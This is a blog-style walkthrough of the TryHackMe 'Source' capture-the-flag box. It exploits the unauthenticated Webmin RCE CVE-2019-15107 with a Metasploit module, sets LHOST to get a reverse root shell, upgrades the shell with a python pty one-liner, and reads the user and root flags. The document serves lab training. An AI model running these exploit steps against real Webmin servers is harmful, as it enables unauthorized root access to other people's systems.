---
layout: post
title: "Source - TryHackMe"
date: 2020-07-11
ctf: true
excerpt: "Walkthrough for Source on TryHackme"
tags: [Source, TryHackMe, Webmin, CVE-2019-15107]
comments: false
---



This is an easy box on [TryHackMe](https://tryhackme.com) based on a recent Webmin exploit. Here are the steps to follow to own this box.

First, let's enumerate the box with nmap with **nmap -p- -vv -T4 [machine ip]**.

This shows 2 ports open, 22 (ssh) and 10000 (typically used for webmin)

![Source nmap](/assets/img/Source1.png)

Let's pull up the site on port 10000 with **https://[machine ip]:10000**. This site is using a self signed certificate, so accept the certificate and you will be presented with a webmin login page. A quick Google search shows you that one of the latest CVEs for Webmin was CVE-2019-15107, which allows for remote code execution without authentication. This is because of a bug in a parameter in password_change.cgi. Let's launch Metasploit with **msfconsole** and run **search webmin 1.920**. One of the results will include an exploit we can use.

![Source Metasploit](/assets/img/Source2.png)

Let's run **use exploit/linux/http/webmin_backdoor** followed by **show options**. You should see a screen similar to the following:

![Source exploit options](/assets/img/Source3.png)

Let's run **SET RHOSTS [machine ip]**, **SET SSL true**, **SET LHOST [your VPN IP] **and then once set, use **run** to attempt the exploit.

![Source run exploit](/assets/img/Source4.png)

You should get a shell within a few moments.

![Source root shell](/assets/img/Source5.png)

Run **whoami** and you will see you have root access.

![Source whoami](/assets/img/Source6.png)

Let's upgrade our shell with **python -c 'import pty; pty.spawn("/bin/sh")'**. Now, let's navigate to the main user home directory with **cd /home** and run **ls** to list the user directories on this server. You will see that there is a user name of **dark** here. 

![Source enumerate user home](/assets/img/Source7.png)

Let's go into his directory with **cd dark** and run **ls -al** to list directory contents. You will see a **user.txt** file, let's run **cat user.txt** and you now have the user flag.

![Source user flag](/assets/img/Source8.png)

Next, let's navigate to /root with **cd /root** and run **ls**. You will see a file named root.txt. Let's view it's contents with **cat root.txt**

![Source root flag](/assets/img/Source9.png)
